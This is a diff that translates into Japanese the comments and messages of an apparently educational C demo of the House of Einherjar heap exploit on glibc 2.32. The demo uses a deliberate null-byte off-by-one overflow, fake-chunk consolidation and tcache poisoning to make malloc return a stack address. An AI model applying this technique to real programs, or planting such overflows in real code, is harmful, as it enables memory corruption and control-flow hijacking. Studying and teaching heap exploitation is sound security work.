@@ -7,36 +7,36 @@
 int main()
 {
 	/*
-	 * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.32.
-	 * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().
-	 * It has the additional requirement of a heap leak.
+	 * Huascar Tejeda (@htejeda) による House of Enherjar のこの改変は、glibc-2.32 で tcache オプションが有効な場合に動作します。
+	 * House of Einherjar は、ヌルバイトによる off-by-one オーバーフローを使って、malloc() が返すポインタを制御します。
+	 * 追加の要件として、ヒープのリークが必要です。
 	 * 
-	 * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,
-	 * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.
-	 * The following restriction for normal bins won't allow us to create chunks bigger than the memory
-	 * allocated from the system in this arena:
+	 * 偽チャンクとの併合に対する制限を回避するために tcache のリストを埋めたあと、
+	 * ヒープ内に偽チャンクを作ることで、(small bin ではなく) unsorted bin を狙います。
+	 * 通常の bin に対する次の制限により、この arena でシステムから確保されたメモリより
+	 * 大きなチャンクを作ることはできません:
 	 *
 	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */
 
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 
-	printf("Welcome to House of Einherjar 2!\n");
-	printf("Tested on Ubuntu 20.10 64bit (glibc-2.32).\n");
-	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+	printf("House of Einherjar 2 へようこそ!\n");
+	printf("Ubuntu 20.10 64bit (glibc-2.32) でテストしています。\n");
+	printf("この技法は、malloc された領域に対してヌルバイトによる off-by-one が可能な場合に使えます。\n");
 
-	printf("This file demonstrates the house of einherjar attack by creating a chunk overlapping situation.\n");
-	printf("Next, we use tcache poisoning to hijack control flow.\n"
-		   "Because of https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,"
-		   "now tcache poisoning requires a heap leak.\n");
+	printf("このファイルは、チャンクの重なり (overlapping) の状況を作ることで house of einherjar 攻撃を示します。\n");
+	printf("次に、tcache poisoning を使って制御フローを乗っ取ります。\n"
+		   "https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 のため、"
+		   "tcache poisoning にはヒープのリークが必要になりました。\n");
 
-	// prepare the target,
-	// due to https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,
-	// it must be properly aligned.
+	// 対象を準備します。
+	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 により、
+	// 適切にアラインされている必要があります。
 	intptr_t stack_var[0x10];
 	intptr_t *target = NULL;
 
-	// choose a properly aligned target address
+	// 適切にアラインされた対象アドレスを選びます
 	for(int i=0; i<0x10; i++) {
 		if(((long)&stack_var[i] & 0xf) == 0) {
 			target = &stack_var[i];
@@ -44,114 +44,114 @@ int main()
 		}
 	}
 	assert(target != NULL);
-	printf("\nThe address we want malloc() to return is %p.\n", (char *)target);
+	printf("\nmalloc() に返させたいアドレスは %p です。\n", (char *)target);
 
-	printf("\nWe allocate 0x38 bytes for 'a' and use it to create a fake chunk\n");
+	printf("\n'a' のために 0x38 バイトを確保し、それを使って偽チャンクを作ります\n");
 	intptr_t *a = malloc(0x38);
 
-	// create a fake chunk
-	printf("\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n");
-	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
+	// 偽チャンクを作ります
+	printf("\n偽チャンクは、重ねたいチャンクより前に作るのが望ましく、そのアドレスを知っている必要があります。\n");
+	printf("unlink のチェックを通すために、fwd と bck のポインタが fake_chunk 自身を指すように設定します\n");
 
-	a[0] = 0;	// prev_size (Not Used)
+	a[0] = 0;	// prev_size (使用しません)
 	a[1] = 0x60; // size
 	a[2] = (size_t) a; // fwd
 	a[3] = (size_t) a; // bck
 
-	printf("Our fake chunk at %p looks like:\n", a);
-	printf("prev_size (not used): %#lx\n", a[0]);
+	printf("%p にある偽チャンクは次のようになっています:\n", a);
+	printf("prev_size (使用しません): %#lx\n", a[0]);
 	printf("size: %#lx\n", a[1]);
 	printf("fwd: %#lx\n", a[2]);
 	printf("bck: %#lx\n", a[3]);
 
-	printf("\nWe allocate 0x28 bytes for 'b'.\n"
-		   "This chunk will be used to overflow 'b' with a single null byte into the metadata of 'c'\n"
-		   "After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n");
+	printf("\n'b' のために 0x28 バイトを確保します。\n"
+		   "このチャンクは、'b' を 1 バイトのヌルバイトでオーバーフローさせ、'c' のメタデータに書き込むために使います\n"
+		   "このチャンクが重なったあとは、解放して tcache poisoning 攻撃に使えます。\n");
 	uint8_t *b = (uint8_t *) malloc(0x28);
 	printf("b: %p\n", b);
 
 	int real_b_size = malloc_usable_size(b);
-	printf("Since we want to overflow 'b', we need the 'real' size of 'b' after rounding: %#x\n", real_b_size);
+	printf("'b' をオーバーフローさせたいので、丸められたあとの 'b' の「実際の」サイズが必要です: %#x\n", real_b_size);
 
-	/* In this case it is easier if the chunk size attribute has a least significant byte with
-	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
-	 * the chunk includes the amount requested plus some amount required for the metadata. */
-	printf("\nWe allocate 0xf8 bytes for 'c'.\n");
+	/* この場合、チャンクの size 属性の最下位バイトが 0x00 であると都合がよくなります。
+	 * チャンクのサイズには、要求された量に加えてメタデータに必要な分が含まれるため、
+	 * この最下位バイトは 0x00 になります。 */
+	printf("\n'c' のために 0xf8 バイトを確保します。\n");
 	uint8_t *c = (uint8_t *) malloc(0xf8);
 
 	printf("c: %p\n", c);
 
 	uint64_t* c_size_ptr = (uint64_t*)(c - 8);
-	// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit
+	// この技法は、確保済みチャンクの size メタデータと prev_inuse ビットを上書きすることで成立します
 
 	printf("\nc.size: %#lx\n", *c_size_ptr);
-	printf("c.size is: (0x100) | prev_inuse = 0x101\n");
+	printf("c.size は (0x100) | prev_inuse = 0x101 です\n");
 
-	printf("We overflow 'b' with a single null byte into the metadata of 'c'\n");
+	printf("'b' を 1 バイトのヌルバイトでオーバーフローさせ、'c' のメタデータに書き込みます\n");
 	// VULNERABILITY
 	b[real_b_size] = 0;
 	// VULNERABILITY
 	printf("c.size: %#lx\n", *c_size_ptr);
 
-	printf("It is easier if b.size is a multiple of 0x100 so you "
-		   "don't change the size of b, only its prev_inuse bit\n");
+	printf("b.size が 0x100 の倍数であると、b のサイズは変わらず "
+		   "prev_inuse ビットだけが変わるので、都合がよくなります\n");
 
-	// Write a fake prev_size to the end of b
-	printf("\nWe write a fake prev_size to the last %lu bytes of 'b' so that "
-		   "it will consolidate with our fake chunk\n", sizeof(size_t));
+	// b の末尾に偽の prev_size を書き込みます
+	printf("\n'b' の最後の %lu バイトに偽の prev_size を書き込み、"
+		   "偽チャンクと併合されるようにします\n", sizeof(size_t));
 	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
-	printf("Our fake prev_size will be %p - %p = %#lx\n", c - sizeof(size_t) * 2, a, fake_size);
+	printf("偽の prev_size は %p - %p = %#lx になります\n", c - sizeof(size_t) * 2, a, fake_size);
 	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
 
-	// Change the fake chunk's size to reflect c's new prev_size
-	printf("\nMake sure that our fake chunk's size is equal to c's new prev_size.\n");
+	// 偽チャンクの size を、c の新しい prev_size に合わせて変更します
+	printf("\n偽チャンクの size が c の新しい prev_size と等しくなるようにします。\n");
 	a[1] = fake_size;
 
-	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", a[1]);
+	printf("偽チャンクの size は現在 %#lx です (b.size + fake_prev_size)\n", a[1]);
 
-	// Now we fill the tcache before we free chunk 'c' to consolidate with our fake chunk
-	printf("\nFill tcache.\n");
+	// チャンク 'c' を解放して偽チャンクと併合させる前に、tcache を埋めます
+	printf("\ntcache を埋めます。\n");
 	intptr_t *x[0x10];
 	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
 		x[i] = malloc(0xf8);
 	}
 
-	printf("Fill up tcache list.\n");
+	printf("tcache のリストを埋めます。\n");
 	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
 		free(x[i]);
 	}
 
-	printf("Now we free 'c' and this will consolidate with our fake chunk since 'c' prev_inuse is not set\n");
+	printf("ここで 'c' を解放します。'c' の prev_inuse が設定されていないため、偽チャンクと併合されます\n");
 	free(c);
-	printf("Our fake chunk size is now %#lx (c.size + fake_prev_size)\n", a[1]);
+	printf("偽チャンクの size は現在 %#lx です (c.size + fake_prev_size)\n", a[1]);
 
-	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
+	printf("\nここで malloc() を呼ぶと、偽チャンクから確保が始まります\n");
 
 	intptr_t *d = malloc(0x158);
-	printf("Next malloc(0x158) is at %p\n", d);
+	printf("次の malloc(0x158) は %p にあります\n", d);
 
-	// tcache poisoning
-	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
-		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n");
+	// tcache poisoning(tcache の汚染)
+	printf("パッチ https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f の適用後は、\n"
+		   "fd ポインタを乗っ取る前に、パディング用にもう 1 つチャンクを作成して解放する必要があります。\n");
 	uint8_t *pad = malloc(0x28);
 	free(pad);
 
-	printf("\nNow we free chunk 'b' to launch a tcache poisoning attack\n");
+	printf("\nここでチャンク 'b' を解放して、tcache poisoning 攻撃を開始します\n");
 	free(b);
-	printf("Now the tcache list has [ %p -> %p ].\n", b, pad);
+	printf("これで tcache のリストは [ %p -> %p ] になりました。\n", b, pad);
 
-	printf("We overwrite b's fwd pointer using chunk 'd'\n");
-	// requires a heap leak because it assumes the address of d is known.
-	// since house of einherjar also requires a heap leak, we can simply just use it here.
+	printf("チャンク 'd' を使って b の fwd ポインタを上書きします\n");
+	// d のアドレスが既知であることを前提としているため、ヒープのリークが必要です。
+	// house of einherjar もヒープのリークを必要とするので、ここではそれをそのまま使えます。
 	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);
 
-	// take target out
-	printf("Now we can cash out the target chunk.\n");
+	// target を取り出します
+	printf("これで対象のチャンクを取り出せます。\n");
 	malloc(0x28);
 	intptr_t *e = malloc(0x28);
-	printf("\nThe new chunk is at %p\n", e);
+	printf("\n新しいチャンクは %p にあります\n", e);
 
-	// sanity check
+	// 確認用のチェック
 	assert(e == target);
-	printf("Got control on target/stack!\n\n");
+	printf("target/スタックの制御を奪いました!\n\n");
 }
